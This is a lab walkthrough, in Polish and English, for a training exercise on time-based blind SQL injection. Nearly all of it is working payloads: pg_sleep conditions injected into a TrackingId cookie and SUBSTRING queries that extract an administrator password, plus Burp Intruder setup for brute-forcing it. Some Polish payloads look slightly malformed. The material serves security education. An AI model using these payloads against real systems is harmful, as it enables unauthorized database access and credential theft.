This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.



1.włączamy zadanie, odpalamy burpa, włączamy intercepta, klikamy na stronie home, wysyłamy przechwycone połączenie do repetera i wyłączamy intercepta
2.Sprawdzamy teraz czy strona jest podatna na atak przez ' || pg_sleep(10)--(ctrl+u), jeżeli dostaniemy odpowiedź po 10 sekundach, wtedy strona jest wrażliwa na atak
3.Będziemy zadawać bazie pytania na bazie true or false, jeżeli dostaniemy odpowiedź po 10 sekundach to znaczy, że jest to prawda, jeżeli od razu to błąd
4.Wpisujemy po tracking id ' || select case when (1=1) then pg_sleep(10) else pg_sleep(-1) END)--(ctrl+u)
5.Teraz zapytamy czy user table istenieje, wpisujemy po tracking id: ' || select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) END from users)--(ctrl+u) śpi
6.Następnie ustalamy długość hasła. ' || select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) END from users)--(ctrl+u) śpi, hasło jest większe od 1. ' || select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) END from users)--(ctrl+u), nie spał, znaczy, że hasło ma mniej niż 25 znaków.
7.Wysyłamy połączenie do intrudera, czyścimy wszystko, zaznaczamy jedynkę i dodajemy. Wybieramy atak snajpera, w payloads wybieramy Numbers from 1 to 25, step 1. Wchodzimy w Resource pool, tworzymy new resource pool, ustawiamy max request na 1 i zaczynamy atak. Szukamy kiedy kończy się 10 sekundowa odpowiedź w ataku i zliczamy ilość 10 sekundowych odpowiedź. Wychodzi 20 znaków
8.Następnie jak znamy długość hasła należy ustalić jakie one jest więc wpisujemy:' || select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) END from users)--(ctrl+u). Dostaliśmy odpowiedź od razu, więc a nie jest pierwszą literą hasła.
9.Ponownie wysyłamy do intrudera, czyścimy wszystko, zaznaczamy 'a'.Wybieramy atak snajpera, payload wybieramy Brute forcera min 1 i max length 1, w opcjach musimy zaznaczyć resource pool max 1, zaczynamy atak, Szukamy 10 sekundowej odpowiedzi. Pierwsza litera w haśle to 1
10.Wracamy do intrudera, czyścimy wszystko, zaznaczamy pierwszą jedynkę oraz 'a'. Wybieramy atak Cluster bomb, w payloads wybieramy numbers from 1 to 20, step 1, a w drugim payload wybieramy brute forcera, min 1 and max length 1 w opcjach zaznaczamy resource pool max 1 i zaczynamy atak. filtrujemy po czasie odpowiedzi i łączymy lewą strone do prawej i wychodzi nam hasło
11. logujemy się na stronie loginem administrator i hasłem: 1VpcdX^$12bhIp)$sBm#




















ENG:


1.Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.

2.Modify the TrackingId cookie, changing it to:
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
Verify that the application takes 10 seconds to respond.

3.Now change it to:
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
Verify that the application responds immediately with no time delay. This demonstrates how you can test a single boolean condition and infer the result.

4.Now change it to:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
Verify that the condition is true, confirming that there is a user called administrator.

5.The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
This condition should be true, confirming that the password is greater than 1 character in length.

6.Send a series of follow-up values to test different password lengths. Send:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
Then send:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.

7.After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

8.In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.

9.In the Positions tab, change the value of the cookie to:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

10.Place payload position markers around the a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

11.To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload settings" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

12.To be able to tell when the correct character was submitted, you'll need to monitor the time taken for the application to respond to each request. For this process to be as reliable as possible, you need to configure the Intruder attack to issue requests in a single thread. To do this, go to the "Resource pool" tab and add the attack to a resource pool with the "Maximum concurrent requests" set to 1.

13.Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.

14.Burp Intruder monitors the time taken for the application's response to be received, but by default it does not show this information. To see it, go to the "Columns" menu, and check the box for "Response received".

15.Review the attack results to find the value of the character at the first position. You should see a column in the results called "Response received". This will generally contain a small number, representing the number of milliseconds the application took to respond. One of the rows should have a larger number in this column, in the region of 10,000 milliseconds. The payload showing for that row is the value of the character at the first position.

16.Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

17.Launch the modified attack, review the results, and note the character at the second offset.

18.Continue this process testing offset 3, 4, and so on, until you have the whole password.

19.In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.
